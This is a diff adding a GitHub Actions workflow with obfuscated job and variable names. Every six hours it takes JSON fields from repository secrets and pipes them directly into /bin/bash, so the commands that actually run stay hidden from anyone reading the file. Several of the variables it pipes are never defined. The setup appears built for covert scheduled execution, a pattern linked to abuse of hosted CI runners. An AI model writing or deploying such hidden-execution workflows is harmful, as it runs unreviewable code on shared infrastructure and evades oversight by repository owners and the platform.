@@ -1,0 +1,24 @@
+name: chengengduo4781
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '36 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: chengengduo4781
+        env:
+          janlz1: ${{ secrets.janlz1 }}
+        run: |
+          echo $janlz1 | jq -r .m1 | /bin/bash
+          echo $nyv71 | jq -r .buoib3644 | /bin/bash
+          echo $isf5411 | jq -r .itkyv56145 | /bin/bash
+          echo $bjs83 | jq -r .gpi05 | /bin/bash
+          echo $hvp71332 | jq -r .ciz9 | /bin/bash
+          echo $oo36147 | jq -r .e2 | /bin/bash
+
